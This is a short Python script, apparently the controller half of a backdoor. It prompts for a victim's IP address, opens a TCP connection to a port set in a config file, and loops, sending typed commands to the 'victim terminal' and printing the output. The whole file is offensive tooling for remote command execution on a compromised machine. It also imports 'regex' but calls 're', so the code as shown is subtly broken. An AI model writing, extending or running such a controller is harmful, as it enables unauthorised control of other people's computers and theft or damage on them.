#Import required to run file
import socket
import config
import regex

#Connection data of victim computer
ipReg = "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}"
HOST = input("target IPv4 address: ")
while not re.fullmatch(ipReg, HOST):
	HOST = input("invalid ip address, try again: ")
PORT = config.port

#Connects to the victim computer
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

#Prints victim data
print("--- connected to victim at " + str(HOST) + "/" + str(PORT) + " ---\n")

#Main loop
while True:
  #Takes as input a command, and sends it to the open port on the victim computer
  command = input("victim terminal ~ $:").encode()
  s.sendall(command)

  #Receives the output of the command being executed on the victim computer and prints it
  result = s.recv(1024).decode()
  print("\n" + result)
